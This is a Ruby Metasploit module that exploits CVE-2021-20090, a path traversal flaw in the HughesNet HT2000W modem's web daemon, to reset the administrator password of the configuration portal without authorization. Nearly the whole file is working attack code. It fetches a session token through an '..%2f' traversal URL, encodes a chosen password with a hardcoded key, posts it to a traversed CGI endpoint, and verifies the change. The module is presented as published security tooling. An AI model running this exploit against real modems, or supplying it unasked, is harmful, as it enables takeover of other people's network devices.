##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'
require 'digest'
require 'uri'
require 'net/http'

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Password reset for HT2000W HughesNet Modem',
                      'Description' => '
        This script takes advantage of CVE-2021-20090, a path traversal vulnerability in the HTTP daemon of the HT2000W modem to reset the administrator password of the configuration portal.
      ',
                      'Author' => ['Simon Greenblatt'],
                      'License' => BSD_LICENSE,
                      'References' => [
                        ['CVE', '2021-20090'],
                        ['URL', 'https://www.tenable.com/security/research/tra-2021-13']
                      ],
                      'DisclosureDate' => '2021-04-29',
                      'DefaultTarget' => 0,
                      'Notes' => {
                        'Stability' => [CRASH_SAFE],
                        'Reliability' => [],
                        'SideEffects' => [CONFIG_CHANGES]
                      }))
    register_options(
      [
        OptString.new('RHOST', [true, 'The IP address of the web portal', '192.168.42.1']),
        OptString.new('PASSWORD', [true, 'The new administrator password'])
      ]
    )
    deregister_options('RHOSTS')
    deregister_options('VHOST')
    deregister_options('SSL')
    deregister_options('Proxies')
    deregister_options('RPORT')
  end

  def get_httoken
    # Make a GET request to system_p.htm using path traversal
    ip_address = datastore['RHOST']

    uri = URI("http://#{ip_address}/images/..%2fsystem_p.htm")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Get.new(uri)
    res = http.request(request)
    '-1' if !res or res.code != 200
    # Extract the httoken hidden in the DOM and convert it from Base64
    Base64.decode64(res.body.match(/AAAIBRAA7(.*?)"/)[1]).force_encoding('ASCII-8BIT').encode('UTF-8',
                                                                                              invalid: :replace, replace: '')
  end

  def encode_pass(password)
    # Vigenere Cipher
    key = 'wg7005d'
    enc_pass = ''
    idx = 0
    password.each_char do |c|
      enc_pass += (c.ord + key[idx].ord).to_s + '+'
      idx = (idx + 1) % key.length
    end
    enc_pass
  end

  def change_pass(httoken, enc_pass)
    # Create a POST request with the httoken and the encoded password
    ip_address = datastore['RHOST']
    uri = URI("http://#{ip_address}/images/..%2fapply_abstract.cgi")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Post.new(uri)
    params = { 'action' => 'ui_system_p', 'httoken' => httoken, 'submit_button' => 'system_p.htm',
               'ARC_SYS_Password' => enc_pass }
    request.body = URI.encode_www_form(params).gsub('%2B', '+')
    request['Content-Type'] = 'application/x-www-form-urlencoded'
    request['Referer'] = "http://#{ip_address}/system_p.htm"
    res = begin
      http.request(request)
    rescue StandardError
      nil
    end
  end

  def verify_pass
    # Make a GET request to cgi_sys_p.js to verify password
    httoken = get_httoken
    ip_address = datastore['RHOST']
    new_pass = datastore['PASSWORD']
    uri = URI("http://#{ip_address}/images/..%2fcgi/cgi_sys_p.js?_tn=#{httoken}")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Get.new(uri)
    request['Referer'] = "http://#{ip_address}/system_p.htm"
    res = http.request(request)
    md5 = Digest::MD5.new
    md5.update(new_pass)
    hash = md5.hexdigest
    if res.body.split('"')[5] != hash
      print_error('Failure: Could not verify the hash of the password')
      exit
    end
    hash
  end

  def run
    new_pass = datastore['PASSWORD']
    httoken = get_httoken
    if httoken == '-1'
      print_error('Failure: Could not request system_p.htm')
      exit
    end
    print_good("Obtained httoken: #{httoken}")
    enc_pass = encode_pass(new_pass)
    change_pass(httoken, enc_pass)
    print_good("Password reset to: #{new_pass}")
    md5 = verify_pass
    print_good("Verified password hash: #{md5}")
    print_good('Password successfully changed!')
  end

  def check
    print_good('Checking service version...')
    ip_address = datastore['RHOST']
    uri = URI("http://#{ip_address}/login.htm")
    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Head.new(uri)
    res = http.request(request)
    Msf::Exploit::CheckCode::Unknown('Could not request login.htm') if !res or res.code != 200
    if res['Server'] != 'Arcadyan httpd 1.0'
      Msf::Exploit::CheckCode::Safe('The server is not running Arcadyan httpd 1.0')
    end
    print_good('Attempting path traversal...')
    httoken = get_httoken
    if httoken == '-1'
      Msf::Exploit::CheckCode::Safe('Could not perform path traversal')
      exit
    end
    Msf::Exploit::CheckCode::Vulnerable
  end
end
